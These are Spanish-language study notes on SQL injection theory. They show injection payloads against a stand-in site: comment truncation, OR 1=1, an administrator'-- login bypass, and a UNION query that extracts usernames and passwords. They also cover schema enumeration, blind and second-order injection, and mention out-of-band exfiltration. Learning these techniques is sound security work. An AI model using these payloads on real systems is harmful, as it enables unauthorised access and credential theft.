# 1 - Teorico

## Intro

Permite introducir codigo sql donde normalmente no estaria permitido y obtener informacion directamente de la base de datos. O modificarla. Es incluso posible escalar esta amenaza a conseguir informacion del servidor.

![](../../.gitbook/assets/imagen%20%28605%29.png)

## Impacto de una inyeccion de SQL

Un ataque exitoso puede resultar en el acceso sin autorizacion o la obtencion de informacion. El atacante puede incluso dejar un backdoor a la organizacion llevando a un impacto a largo tiempo.

## Atacando la URI

Supongamos que tenemos la siguiente URL que genera la siguiente consulta:

```text
https://insecure-website.com/products?category=Gifts
```

```sql
SELECT * FROM products
WHERE category = 'Gifts'
AND released = 1
```

Releleased es un atributo interno dentro de la aplicacion. Ahora si un atacante modificase el codigo de la uri para agregar un comentario y este input no es sanitizado ocurre lo siguiente

```text
https://insecure-website.com/products?category=Gifts'--
```

```sql
SELECT * FROM products
WHERE category = 'Gifts'--'AND released = 1
```

Comenta el codigo y revela informacion de objetos sin release. Mejorando su ataque el atacante podria obtener todos los productos incluido aquellos que no conoce.

```text
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

```sql
SELECT * FROM products
WHERE category = 'Gifts'
OR 1=1--'AND released = 1
```

## Atacando Log-In

Que sucede cuando hacemos log in con nuestro **user**= wiener y nuestro **pass**= bluecheese

```sql
SELECT * FROM users 
WHERE username = 'wiener'
AND password = 'bluecheese'
```

Curioso que pasaria si ponemos de usuario \(sin siquiera pas\) administrator'--

```sql
SELECT * FROM users 
WHERE username = 'administrator' -- 'AND password = ''
```

 `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

## Obteniendo datos de otras tablas \(UNION ATTACK\)

Usando union lo sumamos a nuestra query:

```sql
SELECT name, descriptiion FROM products
WHERE category = 'Gifts'
UNION SELECT username, password FROM users--
```

## Obteniendo informacion de la base

Algo relevante puede ser obtener informacion de la base a modo de seguir atacandola y obtener activos mas criticos. Se puede obtener informacion de las version:

**En oracle:**

```sql
SELECT * FROM v$version
```

Otra forma de obtener info es obtener a travez de esto:

```sql
SELECT * FROM information_schema.tables
```

## Inyeccion a ciegas

Cuando el atacante no sabe contra que motor de base de datos se esta enfrentando. Podemos cambiar la query acorde a elementos logicos que revelan esto. Por ejemplo delays en las query que difieren entre motores.

* Cambios de logica que den errores como dividir por 0.
* Obligar a delays
* Trigger out of band network interactions \(burp collaborator\): Exifltrar info poniendo informacion en un dominio controlado por nosotros.

## **SQL injection in different parts of the query**

La mayoria de las vulnerabilidades ocurren por las clausulas WHERE y SELECT. Estas inyecciones son reconocibles por los testers, pero, muchas tambien pueden ocurrir en otros segmenetos de la query:

*  En `UPDATE` dentro de los`WHERE`
*  En `INSERT` dentro de los valores a insertar
*  En `SELECT` dentro de las tablas o columnas.
*  En `SELECT` dentro de los `ORDER BY`.

## Inyeccion de segundo orden

![](../../.gitbook/assets/imagen%20%28608%29.png)

La diferencia radica en que en este ataque se mantiene el ataque persistido en la base y no actua directamente. En la imagen muestra como al registrarse coloca la inyeccion y luego al hacer la busqueda se ejecuta y cambia al administrador. No en el login sino al registrar usuario.

